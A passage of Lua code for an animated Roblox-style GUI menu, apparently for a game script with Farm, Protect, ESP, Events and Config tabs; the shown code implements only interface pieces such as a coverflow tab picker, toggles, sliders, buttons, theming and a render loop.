local closeBtn = circleButton("×", -16, Theme.Bad)
local minBtn = circleButton("–", -58, Theme.Accent2)

local content = new("Frame", { Parent = window, Position = UDim2.fromOffset(0, 68), Size = UDim2.new(1, 0, 1, -68), BackgroundTransparency = 1, ClipsDescendants = true, ZIndex = 11 })

---------------------------------------------------------------------------
-- Coverflow: the 3D picker from the website. The chosen card comes forward and lights up,
-- the others fall back behind it (smaller, lower, turned away, darker).
-- Swipe it, flick it, or tap a card. Used for the tabs and for the background type.
---------------------------------------------------------------------------
local coverflows = {}
local CARD_DARK = Color3.fromRGB(24, 24, 29)
local function coverflow(holder, names, o, onPick)
	local W0 = o.width or 120
	local cf = { holder = holder, items = {}, pos = 1, vel = 0, target = 1, dragging = false, moved = 0,
		startX = 0, startPos = 1, lastX = 0, lastT = 0, downT = 0, flick = 0, held = nil, lastStep = 1,
		w = W0, h = o.height or 36, spread = o.spread or W0 * 0.78, z = o.z or 31, swipe = o.swipe or 100 }
	for i, name in ipairs(names) do
		local shadow = new("Frame", { Parent = holder, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), BackgroundColor3 = BLACK, BackgroundTransparency = 0.5, BorderSizePixel = 0, ZIndex = cf.z }, { corner() })
		local b = new("TextButton", { Parent = holder, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromOffset(cf.w, cf.h), BackgroundColor3 = CARD_DARK, AutoButtonColor = false, Text = "", ZIndex = cf.z + 1 }, { corner() })
		new("UIGradient", { Parent = b, Rotation = 90, Color = seq({ WHITE, Color3.fromRGB(200, 202, 210) }) })
		local rim = stroke(WHITE, 1.2, 0.5)
		rim.Parent = b
		-- light that runs across the card when it is picked
		local shineFrame = new("Frame", { Parent = b, Size = UDim2.fromScale(1, 1), BackgroundColor3 = WHITE, BorderSizePixel = 0, ZIndex = cf.z + 2 }, { corner() })
		local shine = new("UIGradient", { Parent = shineFrame, Rotation = 20, Offset = Vector2.new(-1.3, 0), Transparency = nseq({ { 0, 1 }, { 0.4, 1 }, { 0.5, 0.3 }, { 0.6, 1 }, { 1, 1 } }) })
		local label = fontProp(new("TextLabel", { Parent = b, BackgroundTransparency = 1, Size = UDim2.fromScale(1, 1), Font = FONT_HEAD, TextSize = o.textSize or 14, TextColor3 = Theme.Muted, Text = string.upper((o.labels and o.labels[i]) or name), ZIndex = cf.z + 3 }))
		local it = { button = b, shadow = shadow, label = label, rim = rim, shine = shine, scale = new("UIScale", { Parent = b }), shadowScale = new("UIScale", { Parent = shadow }), hover = 0, hoverS = 0, heldS = 0 }
		cf.items[i] = it
		bind(b.MouseEnter, function() it.hover = 1 if cf.target ~= i then sfx("Hover", 1.6, 0.15) end end)
		bind(b.MouseLeave, function() it.hover = 0 end)
		bind(b.InputBegan, function(input) if isPress(input) then cf.startDrag(input, i) end end)
	end

	function cf.layout(dt)
		for i, it in ipairs(cf.items) do
			local d = i - cf.pos
			local m = math.min(math.abs(d), 2.4)
			local focus = math.clamp(1 - math.abs(d) * 1.25, 0, 1)
			local fade = math.clamp((math.abs(d) - 1.6) / 0.8, 0, 1)
			it.hoverS = it.hoverS + (it.hover - it.hoverS) * math.min(1, dt * 10)
			it.heldS = it.heldS + (((cf.held == i) and 1 or 0) - it.heldS) * math.min(1, dt * 16)
			local x = (d >= 0 and 1 or -1) * cf.spread * (1.2 * m - 0.2 * m * m)
			local y = m * 3 - focus * 2
			local scale = (1 - 0.2 * m) * (1 - it.heldS * 0.06) * (1 + it.hoverS * 0.05 * (1 - focus))
			local w = cf.w * (1 - 0.18 * math.min(m, 1)) -- squeezed: looks turned away
			local zi = cf.z + 1 + (10 - math.floor(m * 4 + 0.5)) * 4
			local b = it.button
			b.Visible, it.shadow.Visible = fade < 1, fade < 1
			b.Position = UDim2.new(0.5, x, 0.5, y)
			b.Size = UDim2.fromOffset(w, cf.h)
			b.ZIndex = zi
			it.scale.Scale = scale
			it.shadow.ZIndex = zi - 1
			it.shadow.Position = UDim2.new(0.5, x, 0.5, y + 4 + focus * 2)
			it.shadow.Size = UDim2.fromOffset(w + 6, cf.h + 4)
			it.shadowScale.Scale = scale
			it.shadow.BackgroundTransparency = math.clamp(0.45 + m * 0.2 + fade, 0, 1)
			b.BackgroundColor3 = CARD_DARK:Lerp(WHITE, focus):Lerp(BLACK, it.heldS * 0.35 + m * 0.12):Lerp(Color3.fromRGB(48, 48, 56), it.hoverS * (1 - focus) * 0.6)
			b.BackgroundTransparency = fade
			it.label.TextColor3 = Theme.Muted:Lerp(Theme.Text, it.hoverS * 0.7):Lerp(Theme.Dark, focus)
			it.label.TextTransparency = math.clamp(fade + math.max(0, m - 1) * 0.35, 0, 1)
			it.rim.Transparency = math.clamp(0.2 + (1 - focus) * 0.5 + fade, 0, 1)
		end
	end
	function cf.step(dt)
		dt = math.min(dt, 1 / 30)
		if not cf.dragging then
			-- spring toward the chosen card (a touch under critical damping: one soft settle)
			local k = 85
			local c = 2 * math.sqrt(k) * 0.8
			cf.vel = cf.vel + ((cf.target - cf.pos) * k - cf.vel * c) * dt
			cf.pos = cf.pos + cf.vel * dt
		end
		cf.layout(dt)
	end
	-- move the focus to card i (visual only; onPick decides what it means)
	function cf.focus(i)
		local changed = cf.target ~= i
		cf.target, cf.lastStep = i, i
		if changed then
			local it = cf.items[i]
			it.shine.Offset = Vector2.new(-1.3, 0)
			tween(it.shine, 0.9, { Offset = Vector2.new(1.3, 0) }, SINE, INOUT, 0.15)
		end
	end
	local function pick(i)
		if cf.target ~= i then sfx("Click", 1.2, 0.6) sfx("Open", 1.9, 0.25) else sfx("Click", 1.2, 0.4) end
		cf.focus(i)
		if onPick then onPick(i) end
	end
	local function toLocal(px) return px / math.max(rootScale.Scale, 0.01) end
	function cf.startDrag(input, i)
		-- a tap on a card can also reach the holder behind it: keep the card
		if cf.dragging and os.clock() - cf.downT < 0.1 then
			if i then cf.held = i end
			return
		end
		cf.dragging, cf.moved, cf.downT = true, 0, os.clock()
		cf.startX, cf.startPos = input.Position.X, cf.pos
		cf.lastX, cf.lastT, cf.flick = input.Position.X, os.clock(), 0
		cf.held, cf.vel = i, 0
	end
	bind(holder.InputBegan, function(input) if isPress(input) then cf.startDrag(input, nil) end end)
	bind(UserInputService.InputChanged, function(input)
		if not (cf.dragging and isMove(input)) then return end
		local dx = input.Position.X - cf.startX
		cf.moved = math.max(cf.moved, math.abs(dx))
		if cf.moved < 6 then return end
		cf.held = nil
		local raw = cf.startPos - toLocal(dx) / cf.swipe
		-- rubber band past the first and last card
		if raw < 1 then raw = 1 - (1 - raw) * 0.35 elseif raw > #names then raw = #names + (raw - #names) * 0.35 end
		local now = os.clock()
		local step = math.max(now - cf.lastT, 1 / 240)
		cf.flick = cf.flick * 0.5 + (-toLocal(input.Position.X - cf.lastX) / cf.swipe / step) * 0.5
		cf.lastX, cf.lastT = input.Position.X, now
		cf.pos = raw
		local near = math.clamp(math.floor(raw + 0.5), 1, #names)
		if near ~= cf.lastStep then
			cf.lastStep = near
			sfx("Hover", 1.8, 0.25)
		end
	end)
	bind(UserInputService.InputEnded, function(input)
		if not (cf.dragging and isPress(input)) then return end
		cf.dragging = false
		local tapped = cf.held
		cf.held = nil
		if cf.moved < 6 then
			if tapped then pick(tapped) end
			return
		end
		-- a quick flick carries on to the next card
		local flick = math.clamp(cf.flick, -12, 12)
		local land = math.clamp(math.floor(cf.pos + flick * 0.08 + 0.5), 1, #names)
		cf.vel = flick * 0.6
		cf.target = -1 -- make sure the landing card gets its light sweep
		pick(land)
	end)
	table.insert(coverflows, cf)
	return cf
end

---------------------------------------------------------------------------
-- Tabs
---------------------------------------------------------------------------
local TAB_NAMES = { "Farm", "Protect", "ESP", "Events", "Config" }
local DECK_W, DECK_H = 384, 50
-- it lives outside the window so it can fly in on its own before the window appears
local deck = new("CanvasGroup", { Parent = root, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 34, 0, 34), Size = UDim2.fromOffset(DECK_W, DECK_H), BackgroundTransparency = 1, ZIndex = 30 })
local deckBase = deck.Position
-- the ends fade out so the cards look like they go round a curve
new("UIGradient", { Parent = deck, Transparency = nseq({ { 0, 1 }, { 0.1, 0.15 }, { 0.22, 0 }, { 0.78, 0 }, { 0.9, 0.15 }, { 1, 1 } }) })

local tabs, pages, cardsOf, tabIndex, currentTab = {}, {}, {}, {}, nil
local selectTab
local carousel = coverflow(deck, TAB_NAMES, { width = 118, height = 34, spread = 92, z = 31, swipe = 100 }, function(i) selectTab(TAB_NAMES[i]) end)

local function cascadeIn(name)
	for i, c in ipairs(cardsOf[name] or {}) do
		if c.obj.Parent and c.obj.Visible then
			c.obj.Rotation = 0
			c.scale.Scale = 0.9
			tween(c.scale, 0.6, { Scale = 1 }, Q, OUT, 0.05 + i * 0.035)
		end
	end
end

selectTab = function(name)
	local toI = tabIndex[name]
	carousel.focus(toI)
	if currentTab == name then return end
	local prevName = currentTab
	local prev = prevName and pages[prevName]
	currentTab = name
	local fromI = tabIndex[prevName] or toI
	local dir = (prev and toI < fromI) and -1 or 1
	if prev then
		prev.ZIndex = 11
		tween(prev, 0.35, { GroupTransparency = 1, Position = UDim2.fromOffset(-60 * dir, 0) }, Q, OUT)
		task.delay(0.35, function() if currentTab ~= prevName then prev.Visible = false end end)
	end
	local page = pages[name]
	page.ZIndex = 12
	page.Visible = true
	page.Position = UDim2.fromOffset(60 * dir, 0)
	page.GroupTransparency = 1
	tween(page, 0.55, { GroupTransparency = 0, Position = UDim2.fromOffset(0, 0) }, Q, OUT)
	cascadeIn(name)
end

local function addPage(name)
	local i = #TAB_NAMES
	for k, n in ipairs(TAB_NAMES) do if n == name then i = k end end
	tabIndex[name] = i

	local page = new("CanvasGroup", { Parent = content, Name = name, Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, GroupTransparency = 1, Visible = false, ZIndex = 11 })
	local scroll = new("ScrollingFrame", {
		Parent = page, Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, BorderSizePixel = 0, ScrollBarThickness = 3, ScrollBarImageColor3 = Theme.Accent2,
		CanvasSize = UDim2.new(), AutomaticCanvasSize = Enum.AutomaticSize.Y, ScrollingDirection = Enum.ScrollingDirection.Y, ZIndex = 11,
	}, { pad(6, 18, 18, 18), new("UIListLayout", { Padding = UDim.new(0, 10), SortOrder = Enum.SortOrder.LayoutOrder }) })
	pages[name] = page
	cardsOf[name] = {}
	return { scroll = scroll, name = name, grid = nil, order = 0 }
end

---------------------------------------------------------------------------
-- Components: liquid-glass cards in a two-column grid
---------------------------------------------------------------------------
local function Section(pg, text)
	pg.order = pg.order + 1
	local f = new("Frame", { Parent = pg.scroll, Size = UDim2.new(1, 0, 0, 22), BackgroundTransparency = 1, LayoutOrder = pg.order, ZIndex = 12 })
	local l = fontProp(new("TextLabel", { Parent = f, BackgroundTransparency = 1, Size = UDim2.fromScale(1, 1), Font = FONT_HEAD, TextSize = 14, TextColor3 = Theme.Accent2, TextXAlignment = Enum.TextXAlignment.Left, Text = string.upper(text), ZIndex = 12 }))
	themeProp(l, "TextColor3", "Accent2")
	pg.order = pg.order + 1
	pg.lastLabel = l
	pg.grid = new("Frame", { Parent = pg.scroll, Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, BackgroundTransparency = 1, LayoutOrder = pg.order, ZIndex = 12 },
		{ new("UIGridLayout", { CellSize = UDim2.new(0.5, -5, 0, 74), CellPadding = UDim2.fromOffset(10, 10), SortOrder = Enum.SortOrder.LayoutOrder }) })
end

local function card(pg)
	-- see-through glass: the background photo shows through, it darkens on hover and while held
	local c = new("TextButton", { Parent = pg.grid, BackgroundColor3 = Theme.Card, AutoButtonColor = false, Text = "", ClipsDescendants = true, ZIndex = 12 }, { corner(20) })
	themeProp(c, "BackgroundColor3", "Card")
	local rim = liquidGlass(c, 0.58)
	local sc = new("UIScale", { Parent = c })
	table.insert(cardsOf[pg.name], { obj = c, scale = sc })
	glassInteract(c, sc)
	bind(c.MouseEnter, function() sfx("Hover", 1.7, 0.2) tween(rim, 0.3, { Thickness = 1.8 }) end)
	bind(c.MouseLeave, function() tween(rim, 0.4, { Thickness = 1.2 }) end)
	bind(c.InputBegan, function(input) if isPress(input) then sfx("Click", 1, 0.7) end end)
	return c, sc
end
local function cardText(c, titleText, desc, rightSpace)
	new("TextLabel", { Parent = c, BackgroundTransparency = 1, Position = UDim2.fromOffset(16, desc and 14 or 0), Size = UDim2.new(1, -(rightSpace or 80), 0, desc and 20 or 74), Font = Enum.Font.GothamBold, TextSize = 14, TextColor3 = Theme.Text, TextXAlignment = Enum.TextXAlignment.Left, TextTruncate = Enum.TextTruncate.AtEnd, Text = titleText, ZIndex = 13 })
	if desc then
		new("TextLabel", { Parent = c, BackgroundTransparency = 1, Position = UDim2.fromOffset(16, 36), Size = UDim2.new(1, -(rightSpace or 80), 0, 28), Font = Enum.Font.Gotham, TextSize = 11, TextColor3 = Theme.Muted, TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top, TextWrapped = true, Text = desc, ZIndex = 13 })
	end
end

-- one small particle: flies by (dx, dy) and fades
local function spark(parent, x, y, dx, dy, color, life, size, style)
	local s = size or 3
	local p = new("Frame", { Parent = parent, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromOffset(x, y), Size = UDim2.fromOffset(s, s), BackgroundColor3 = color or WHITE, BorderSizePixel = 0, ZIndex = 20 }, { corner() })
	tween(p, life or 0.6, { Position = UDim2.fromOffset(x + dx, y + dy), Size = UDim2.fromOffset(0, 0), BackgroundTransparency = 1 }, style or Q, OUT)
	task.delay((life or 0.6) + 0.05, function() p:Destroy() end)
end
-- centre of a GUI object inside another one, in the window's own pixels
local function centerIn(obj, parent)
	local s = math.max(rootScale.Scale, 0.01)
	local p = (obj.AbsolutePosition + obj.AbsoluteSize / 2 - parent.AbsolutePosition) / s
	return p.X, p.Y
end

local function Toggle(pg, titleText, desc, default, callback)
	local c, sc = card(pg)
	cardText(c, titleText, desc, 84)
	local rim = c:FindFirstChildOfClass("UIStroke")
	local titleL = c:FindFirstChildOfClass("TextLabel")
	local track = new("Frame", { Parent = c, AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, -16, 0.5, 0), Size = UDim2.fromOffset(54, 30), BackgroundColor3 = BLACK, BackgroundTransparency = 0.55, ClipsDescendants = true, ZIndex = 13 }, { corner() })
	local trackFill = new("Frame", { Parent = track, Size = UDim2.fromScale(0, 1), BackgroundColor3 = WHITE, BackgroundTransparency = 0.1, BorderSizePixel = 0, ZIndex = 13 }, { corner() })
	local fillGrad = new("UIGradient", { Parent = trackFill, Color = seq({ Theme.Accent2, Theme.Accent }) })
	-- the charge: a band of light that runs through the track when it turns on
	local zap = new("Frame", { Parent = track, Size = UDim2.fromScale(1, 1), BackgroundColor3 = WHITE, BorderSizePixel = 0, ZIndex = 14 }, { corner() })
	local zapG = new("UIGradient", { Parent = zap, Offset = Vector2.new(-1.2, 0), Transparency = nseq({ { 0, 1 }, { 0.4, 1 }, { 0.5, 0.05 }, { 0.6, 1 }, { 1, 1 } }) })
	local trackRim = stroke(WHITE, 1, 0.6)
	trackRim.Parent = track
	local knob = new("Frame", { Parent = c, AnchorPoint = Vector2.new(0.5, 0.5), Size = UDim2.fromOffset(22, 22), BackgroundColor3 = WHITE, ZIndex = 16 }, { corner() })
	new("UIGradient", { Parent = knob, Rotation = 90, Color = seq({ WHITE, Color3.fromRGB(205, 212, 226) }) })
	local kGlow = stroke(Theme.Accent2, 0, 0.35)
	kGlow.Parent = knob
	-- light across the whole card (bright on, dark off)
	local wash = new("Frame", { Parent = c, Size = UDim2.fromScale(1, 1), BackgroundColor3 = WHITE, BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 12 }, { corner(20), new("UIGradient", { Transparency = nseq({ { 0, 1 }, { 0.6, 0.6 }, { 1, 0.2 } }) }) })
	local state = default and true or false
	-- knob lives on the card so it can grow past the track
	local function knobPos(on) return on and UDim2.new(1, -31, 0.5, 0) or UDim2.new(1, -55, 0.5, 0) end
	knob.Position = knobPos(state)
	trackFill.Size = state and UDim2.fromScale(1, 1) or UDim2.fromScale(0, 1)
	kGlow.Thickness = state and 4 or 0
	local function powerOn()
		fillGrad.Color = seq({ Theme.Accent2, Theme.Accent })
		-- knob stretches, flies across, lands with a bounce
		tween(knob, 0.12, { Size = UDim2.fromOffset(34, 18) }, QUAD, OUT)
		tween(knob, 0.42, { Position = knobPos(true) }, Q, OUT)
		task.delay(0.12, function() tween(knob, 0.5, { Size = UDim2.fromOffset(22, 22) }, BACK, OUT) end)
		tween(trackFill, 0.4, { Size = UDim2.fromScale(1, 1) }, Q, OUT)
		zapG.Offset = Vector2.new(-1.2, 0)
		tween(zapG, 0.55, { Offset = Vector2.new(1.2, 0) }, SINE, INOUT, 0.1)
		tween(kGlow, 0.4, { Thickness = 4 })
		tween(trackRim, 0.3, { Transparency = 0.1 })
		-- the card lights up from the switch side and the rim flares
		wash.BackgroundColor3 = Theme.Accent2
		wash.BackgroundTransparency = 0.55
		tween(wash, 0.8, { BackgroundTransparency = 1 }, Q, OUT, 0.1)
		if rim then
			rim.Thickness = 2.8
			tween(rim, 0.7, { Thickness = 1.2 }, Q, OUT)
		end
		if titleL then
			titleL.TextColor3 = Theme.Accent2
			tween(titleL, 0.8, { TextColor3 = Theme.Text }, Q, OUT, 0.2)
		end
		-- a halo pops out of the knob, sparks fly up
		task.delay(0.3, function()
			local x, y = centerIn(knob, c)
			local halo = new("Frame", { Parent = c, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromOffset(x, y), Size = UDim2.fromOffset(22, 22), BackgroundTransparency = 1, ZIndex = 15 }, { corner() })
			local hs = stroke(Theme.Accent2, 2, 0)
			hs.Parent = halo
			tween(halo, 0.6, { Size = UDim2.fromOffset(58, 58) }, Q, OUT)
			tween(hs, 0.6, { Transparency = 1, Thickness = 0.5 }, Q, OUT)
			task.delay(0.65, function() halo:Destroy() end)
			for k = 1, 9 do
				local a = -math.pi / 2 + (k - 5) * 0.32 + (math.random() - 0.5) * 0.2
				local d = math.random(16, 30)
				spark(c, x, y, math.cos(a) * d, math.sin(a) * d, (k % 3 == 0) and WHITE or Theme.Accent2, 0.6, math.random(2, 4))
			end
		end)
		sfx("Toggle", 1.3, 0.6)
		sfx("Notify", 1.6, 0.2)
	end
	local function powerOff()
		-- knob implodes, slides home, then puffs back to size
		tween(knob, 0.16, { Size = UDim2.fromOffset(14, 14) }, QUAD, OUT)
		tween(knob, 0.45, { Position = knobPos(false) }, Q, INOUT)
		task.delay(0.35, function() tween(knob, 0.45, { Size = UDim2.fromOffset(22, 22) }, BACK, OUT) end)
		-- the colour drains out of the track
		tween(trackFill, 0.5, { Size = UDim2.fromScale(0, 1) }, Q, INOUT)
		tween(kGlow, 0.3, { Thickness = 0 })
		tween(trackRim, 0.4, { Transparency = 0.6 })
		-- the card dims for a moment, the switch trembles
		wash.BackgroundColor3 = BLACK
		wash.BackgroundTransparency = 0.35
		tween(wash, 0.7, { BackgroundTransparency = 1 }, SINE, OUT, 0.1)
		if titleL then
			titleL.TextColor3 = Theme.Muted
			tween(titleL, 0.7, { TextColor3 = Theme.Text }, SINE, OUT, 0.2)
		end
		task.spawn(function()
			for k = 1, 4 do
				track.Position = UDim2.new(1, -16 + ((k % 2 == 0) and 2 or -2), 0.5, 0)
				task.wait(0.03)
			end
			track.Position = UDim2.new(1, -16, 0.5, 0)
		end)
		-- grey embers drop out of the switch
		local x, y = centerIn(track, c)
		for k = 1, 6 do
			spark(c, x + math.random(-22, 22), y, math.random(-6, 6), math.random(24, 42), Color3.fromRGB(120, 122, 130), 0.75, math.random(2, 3), QUAD)
		end
		sfx("Toggle", 0.75, 0.55)
		sfx("Close", 1.7, 0.2)
	end
	bind(c.Activated, function()
		state = not state
		if state then powerOn() else powerOff() end
		pressBounce(sc, 0.95)
		task.spawn(callback, state)
	end)
	return {
		set = function(v) if v ~= state then state = v if state then powerOn() else powerOff() end end task.spawn(callback, state) end,
		get = function() return state end,
	}
end

local function Slider(pg, titleText, min, max, default, suffix, callback, snapFn, fmtFn)
	local c = card(pg)
	new("TextLabel", { Parent = c, BackgroundTransparency = 1, Position = UDim2.fromOffset(16, 12), Size = UDim2.new(1, -110, 0, 20), Font = Enum.Font.GothamBold, TextSize = 14, TextColor3 = Theme.Text, TextXAlignment = Enum.TextXAlignment.Left, Text = titleText, ZIndex = 13 })
	local valuePill = new("Frame", { Parent = c, AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -14, 0, 10), Size = UDim2.fromOffset(66, 24), BackgroundColor3 = BLACK, ClipsDescendants = true, ZIndex = 13 }, { corner() })
	liquidGlass(valuePill, 0.55)
	-- the number rolls: up from below when it rises, down from above when it falls
	local valueText = new("TextLabel", { Parent = valuePill, BackgroundTransparency = 1, Size = UDim2.fromScale(1, 1), Font = Enum.Font.GothamBold, TextSize = 12, TextColor3 = Theme.Accent2, Text = "", ZIndex = 14 })
	themeProp(valueText, "TextColor3", "Accent2")
	local vsc = new("UIScale", { Parent = valuePill })
	local bar = new("Frame", { Parent = c, Position = UDim2.new(0, 16, 0, 48), Size = UDim2.new(1, -32, 0, 8), BackgroundColor3 = BLACK, BackgroundTransparency = 0.5, ZIndex = 13 }, { corner() })
	local fillBar = new("Frame", { Parent = bar, Size = UDim2.fromScale(0, 1), BackgroundColor3 = WHITE, BackgroundTransparency = 0.1, ZIndex = 14 }, { corner() })
	local fg = shimmerGradient(new("UIGradient", { Parent = fillBar, Color = seq({ Theme.Accent, Theme.Accent2, Theme.Accent }) }), 0.8)
	local knob = new("Frame", { Parent = bar, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0, 0.5), Size = UDim2.fromOffset(20, 20), BackgroundColor3 = WHITE, ZIndex = 16 }, { corner() })
	new("UIGradient", { Parent = knob, Rotation = 90, Color = seq({ WHITE, Color3.fromRGB(205, 212, 226) }) })
	local kStroke = stroke(Theme.Accent, 3, 0.15)
	kStroke.Parent = knob
	themeProp(kStroke, "Color")
	local kScale = new("UIScale", { Parent = knob })
	-- soft halo that grows around the knob while you hold it
	local halo = new("Frame", { Parent = knob, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ZIndex = 15 }, { corner() })
	local haloS = stroke(Theme.Accent2, 2, 1)
	haloS.Parent = halo
	local value = default
	local dragging = false
	local lastTick, lastFx = 0, 0
	local function render(v, animate)
		local nv = snapFn and snapFn(v) or math.clamp(math.floor(v + 0.5), min, max)
		local dir = nv > value and 1 or (nv < value and -1 or 0)
		value = nv
		local a = (value - min) / (max - min)
		local t = animate and 0.2 or 0
		fg.Color = seq({ Theme.Accent, Theme.Accent2, Theme.Accent })
		tween(fillBar, t, { Size = UDim2.fromScale(a, 1) }, Q)
		tween(knob, t, { Position = UDim2.fromScale(a, 0.5) }, Q)
		valueText.Text = fmtFn and fmtFn(value) or (tostring(value) .. (suffix or ""))
		if not (animate and dir ~= 0) then return end
		valueText.Position = UDim2.fromOffset(0, dir * 9)
		tween(valueText, 0.3, { Position = UDim2.fromOffset(0, 0) }, Q, OUT)
		vsc.Scale = 1.1
		tween(vsc, 0.35, { Scale = 1 }, BACK)
		-- the line brightens going up and dims a little going down
		fillBar.BackgroundTransparency = dir > 0 and 0 or 0.35
		tween(fillBar, 0.5, { BackgroundTransparency = 0.1 }, Q)
		if os.clock() - lastFx > 0.04 then
			lastFx = os.clock()
			local x, y = centerIn(knob, c)
			if dir > 0 then
				-- rising: bright sparks shoot up and forward
				for _ = 1, 2 do spark(c, x, y, math.random(4, 16), -math.random(12, 26), (math.random() < 0.4) and WHITE or Theme.Accent2, 0.5, math.random(2, 4)) end
			else
				-- falling: grey drops fall off behind
				spark(c, x, y, -math.random(4, 14), math.random(12, 24), Color3.fromRGB(130, 132, 140), 0.6, math.random(2, 3), QUAD)
			end
		end
		-- revving tick: higher value, higher pitch
		if dragging and os.clock() - lastTick > 0.035 then
			lastTick = os.clock()
			sfx("Slider", 0.6 + a * 1.8, 0.35)
		end
		-- hitting the top flashes the card, hitting the bottom thuds
		if dragging and (value == max or value == min) then
			local x, y = centerIn(knob, c)
			if value == max then
				burst(c, x, y, Theme.Accent2, 12)
				sfx("Toggle", 1.5, 0.4)
			else
				for k = 1, 5 do spark(c, x + k * 3, y, 0, math.random(18, 30), Color3.fromRGB(110, 112, 120), 0.6, 3, QUAD) end
				sfx("Toggle", 0.6, 0.4)
			end
		end
	end
	render(default, false)
	local function fromX(x)
		local a = math.clamp((x - bar.AbsolutePosition.X) / bar.AbsoluteSize.X, 0, 1)
		local before = value
		render(min + a * (max - min), true)
		if value ~= before then task.spawn(callback, value) end
	end
	bind(c.InputBegan, function(input)
		if isPress(input) and guiY(input.Position.Y) >= bar.AbsolutePosition.Y - 20 then
			dragging = true
			tween(kScale, 0.4, { Scale = 1.4 }, BACK, OUT)
			tween(haloS, 0.3, { Transparency = 0.3 })
			tween(halo, 0.4, { Size = UDim2.fromScale(1.9, 1.9) }, Q, OUT)
			fromX(input.Position.X)
		end
	end)
	bind(UserInputService.InputChanged, function(input) if dragging and isMove(input) then fromX(input.Position.X) end end)
	bind(UserInputService.InputEnded, function(input)
		if dragging and isPress(input) then
			dragging = false
			tween(kScale, 0.5, { Scale = 1 }, BACK, OUT)
			-- the halo lets go in a ring
			tween(halo, 0.5, { Size = UDim2.fromScale(2.8, 2.8) }, Q, OUT)
			tween(haloS, 0.5, { Transparency = 1 }, Q, OUT)
			task.delay(0.5, function() halo.Size = UDim2.fromScale(1, 1) end)
		end
	end)
	return { set = function(v) render(v, true) task.spawn(callback, value) end, show = function(v) render(v, true) end, get = function() return value end }
end

local function Button(pg, titleText, desc, label, callback)
	local c, sc = card(pg)
	cardText(c, titleText, desc, 100)
	local bGlow = new("Frame", { Parent = c, AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, -10, 0.5, 4), Size = UDim2.fromOffset(82, 34), BackgroundColor3 = Theme.Accent2, BackgroundTransparency = 1, Visible = false, ZIndex = 13 }, { corner() })
	themeProp(bGlow, "BackgroundColor3", "Accent2")
	local btn = new("TextLabel", { Parent = c, AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, -14, 0.5, 0), Size = UDim2.fromOffset(74, 32), BackgroundColor3 = WHITE, Font = Enum.Font.GothamBold, TextSize = 12, TextColor3 = WHITE, Text = label or "Run", ZIndex = 14 }, { corner() })
	liquidGlass(btn, 0.82)
	local bsc = new("UIScale", { Parent = btn })
	bind(c.Activated, function()
		pressBounce(sc, 0.95)
		pressBounce(bsc, 0.8)
		sfx("Toggle", 1.5, 0.4)
		burst(c, btn.AbsolutePosition.X - c.AbsolutePosition.X + 37, 37, WHITE, 10)
		task.spawn(callback)
	end)
end

local function Info(pg, label, value)
	local c = card(pg)
	new("TextLabel", { Parent = c, BackgroundTransparency = 1, Position = UDim2.fromOffset(16, 14), Size = UDim2.new(1, -32, 0, 14), Font = Enum.Font.Gotham, TextSize = 11, TextColor3 = Theme.Muted, TextXAlignment = Enum.TextXAlignment.Left, Text = string.upper(label), ZIndex = 13 })
	new("TextLabel", { Parent = c, BackgroundTransparency = 1, Position = UDim2.fromOffset(16, 32), Size = UDim2.new(1, -32, 0, 28), Font = Enum.Font.GothamBlack, TextSize = 18, TextColor3 = Theme.Text, TextXAlignment = Enum.TextXAlignment.Left, TextTruncate = Enum.TextTruncate.AtEnd, Text = value, ZIndex = 13 })
end

---------------------------------------------------------------------------
-- Themes + animation loop
---------------------------------------------------------------------------
local rainbow = false
local themeCards = {}
local function refreshThemeCards()
	for name, tc in pairs(themeCards) do
		local on = name == currentTheme.Name
		tween(tc.ring, 0.35, { Transparency = on and 0 or 1, Thickness = on and 3 or 1 })
		tween(tc.check, 0.5, { Size = on and UDim2.fromOffset(24, 24) or UDim2.fromOffset(0, 0) }, BACK)
	end
end
local function applyTheme(t, quiet)
	currentTheme = t
	loadThemeColors(t)
	for _, a in ipairs(themed) do
		if a.inst.Parent then tween(a.inst, 0.7, { [a.prop] = Theme[a.key] }) end
	end
	for _, g in ipairs(borderGradients) do g.Color = borderSeq() end
	applyBackground(t, true)
	refreshThemeCards()
	glowFlash = 1
	if not quiet then notify("Theme", t.Name .. " applied", 2, t.Accent) end
end

local clock = 0
local gravityRest = nil
bind(RunService.RenderStepped, function(dt)
	clock = clock + dt
	for i = #spinners, 1, -1 do
		local s = spinners[i]
		if s.g.Parent then s.g.Rotation = (s.g.Rotation + dt * s.s) % 360 else table.remove(spinners, i) end
	end
	for i = #shimmers, 1, -1 do
		local s = shimmers[i]
		if s.g.Parent then s.g.Offset = Vector2.new(math.sin(clock * s.s * math.pi) * 0.5, 0) else table.remove(shimmers, i) end
	end
	for img, sh in pairs(animated) do
		if img.Parent then
			local frame = math.floor(clock * (sh.FPS or 12)) % sh.Frames
			local w, h = img.ImageRectSize.X, img.ImageRectSize.Y
			img.ImageRectOffset = Vector2.new((frame % sh.Columns) * w, math.floor(frame / sh.Columns) * h)
		else
			animated[img] = nil
		end
	end
	if rainbow then
		Theme.Accent = Color3.fromHSV((clock * 0.08) % 1, 0.75, 1)
		Theme.Accent2 = Color3.fromHSV((clock * 0.08 + 0.08) % 1, 0.35, 1)
		for _, g in ipairs(borderGradients) do g.Color = borderSeq() end
		for _, a in ipairs(themed) do
			if a.inst.Parent and (a.key == "Accent" or a.key == "Accent2") then a.inst[a.prop] = Theme[a.key] end
		end
	end
	-- breathing glow (flashes on theme change), floating orb, idle logo bob
